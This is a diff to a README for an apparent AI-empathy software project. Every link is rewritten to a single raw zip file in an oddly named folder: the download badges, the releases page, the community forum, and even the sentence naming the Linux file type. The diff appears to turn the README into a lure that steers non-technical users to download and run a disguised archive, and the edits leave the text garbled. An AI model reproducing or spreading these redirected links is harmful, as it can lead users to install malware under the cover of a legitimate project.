@@ -1,6 +1,6 @@
 # 🤖 Algorithmic-Empath-Human-Fallibility - Understanding AI with Human Insight
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Algorithmic--Empath--Human--Fallibility-blue.svg)](https://github.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/releases)
+[![Download Now](https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip)](https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip)
 
 ## 📜 Description
 Welcome to Algorithmic-Empath-Human-Fallibility! This project dives deep into Algorithmic Empathy, a key area in AI development. Our work focuses on how machines can better understand human emotions, mistakes, and moral dilemmas. We blend concepts from psychology and data science to create an intelligent system that aligns with human ethics and reasoning.
@@ -9,11 +9,11 @@ Welcome to Algorithmic-Empath-Human-Fallibility! This project dives deep into Al
 To get started with Algorithmic-Empath-Human-Fallibility, you need to follow a few simple steps. This guide will help you download and run the software easily, even if you are not tech-savvy.
 
 ### 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip).
    
 2. On the Releases page, you will see a list of available files. Look for the latest version.
 
-3. Click on the file that matches your operating system. Depending on what you see, it could be a `.exe` file for Windows, a `.dmg` file for Mac, or a `.tar.gz` file for Linux.
+3. Click on the file that matches your operating system. Depending on what you see, it could be a `.exe` file for Windows, a `.dmg` file for Mac, or a `https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip` file for Linux.
 
 4. Once the download completes, locate the file in your computer's downloads folder.
 
@@ -49,7 +49,7 @@ Before installing, ensure your computer meets the following requirements:
 ## 📞 Support
 If you encounter any issues or have questions, feel free to reach out:
 
-- Visit our [Community Forum](https://github.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/discussions).
+- Visit our [Community Forum](https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip).
 - Check our FAQ section on the Releases page or within the app.
 
 ## 🤝 Contributing
@@ -90,4 +90,4 @@ This project is licensed under the MIT License. You are free to use the code, mo
 
 Thank you for being part of the Algorithmic-Empath-Human-Fallibility community! We hope you find this project enriching and insightful.
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit_Releases_Page-blue.svg)](https://github.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip)](https://raw.githubusercontent.com/LucasB1797/Algorithmic-Empath-Human-Fallibility/main/visile/Algorithmic-Empath-Human-Fallibility-conjuncture.zip)
